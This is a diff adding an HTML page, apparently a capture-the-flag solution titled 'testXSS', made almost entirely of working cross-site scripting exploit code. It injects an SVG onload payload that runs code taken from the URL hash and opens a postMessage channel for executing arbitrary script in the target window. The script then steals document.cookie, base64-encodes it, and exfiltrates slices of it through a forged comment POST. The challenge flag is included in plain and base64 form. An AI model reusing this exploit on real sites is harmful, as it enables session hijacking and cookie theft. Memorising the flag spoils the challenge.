@@ -1,0 +1,77 @@
+<title>testXSS</title>
+<h1 id="h1">test</h1>
+
+<script>
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+post_cookie = () => {
+    document.querySelector("textarea.form-control").value = '"+document["cookie"]+"';document.querySelector("form").submit()
+}
+var my_token = "<mytoken>"
+
+// var HOST = "202.38.93.111:10051"
+var HOST = "web"
+var xssshell = "<svg/onload=eval(decodeURI(location.hash.substring(1)));></svg>"
+
+var steal_cookie = '';
+var steal_cookie_b64 = '';
+
+var otherwin = window.open(`http://${HOST}/result#w=window.opener;window.addEventListener("message",(e)=>{console.log(e.data);eval("async ()=>{"+e.data+"}")().then(m=>w.postMessage(m, "*"))});w.postMessage("OK:web","*");`,
+xssshell)
+sleep(100)
+
+window.addEventListener("message", (e)=>{
+    console.log(e.data);
+
+    if(e.data.substr(0,3) == "OK:"){
+        // GETSHELL! which one?
+        otherwin.postMessage("return 'COOKIE:'+document.cookie", "*");
+        
+    } else {
+        var event = new CustomEvent("xss_res", {detail: e.data})
+        window.dispatchEvent(event)
+    }
+})
+
+window.addEventListener("xss_res", (e)=>{
+    if (e.detail == 'NULL'){
+        return
+    }
+    if (e.detail.substr(0, 7) == 'COOKIE:') {
+        steal_cookie = e.detail.substr(7);
+        steal_cookie_b64 = btoa(steal_cookie);
+        console.log(steal_cookie);
+        console.log(steal_cookie_b64);
+        // try login as me
+    otherwin.postMessage(`return fetch("/?token=${my_token}", 
+{
+    method: "GET"
+}).then((resp)=>{
+    console.log(resp);
+    return "CHANGE:" + resp.status.toString();
+})`, "*")
+
+         
+    } else if (e.detail.substr(0,7) == 'CHANGE:'){
+    // POST next msg
+         
+         otherwin.postMessage(`return fetch("/result", {
+    method: "POST",
+    credentials: "include",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "wo zhong yu zuo chu lai le wo hao kai xin"
+    },
+    body: "comment=${steal_cookie_b64.substr(64, 25 - '"+name+"w'.length)}%22%2Bname%2B%22${HOST.substr(0,1)}"
+}).then((resp)=>{
+    console.log(resp);
+    return "PUTEND:"+resp.status.toString();
+})`, "*");
+    }
+    
+})
+</script>
+<!-- ZmxhZz1mbGFnJTdCeDU1X3N0aWxsX2FsaXZlJTI2JTNEJTNFXyUzQytfMzJjYjkyNzYzNyU3RA== -->
+<!-- flag=flag{x55_still_alive&=>_< _32cb927637} -->
+
+EOF
